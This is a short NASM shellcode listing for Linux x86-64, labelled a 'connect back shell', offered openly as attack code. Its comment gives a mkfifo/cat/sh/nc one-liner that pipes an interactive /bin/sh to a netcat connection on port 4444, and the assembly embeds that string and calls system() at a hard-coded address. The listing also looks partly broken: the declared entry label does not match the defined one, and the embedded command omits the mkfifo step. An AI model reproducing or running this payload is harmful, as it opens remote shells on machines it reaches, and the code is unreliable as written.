; { Title: Shellcode linux/x86-64 connect back shell }
; Author    : Gaussillusion
; Len       : 109 bytes
; Language  : Nasm



;This method only works on debian as system runs everything through /bin/sh which drops privileges. However /bin/sh is modified on debian and will not drop privs. Please refer to: https://linux.die.net/man/3/system

;syscall: system("mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc localhost 4444>/tmp/f");

global _start
start:
xor rax,rax
xor rdi,rdi
xor rsi,rsi
xor rdx,rdx

jmp short msg
routine:
pop rdi
call   0x400400 ;<system@plt>
mov    eax,0x0
pop    rbp
ret    

msg:
call routine
db 'cat /tmp/f|/bin/sh -i 2>&1| nc localhost 4444>/tmp/f'
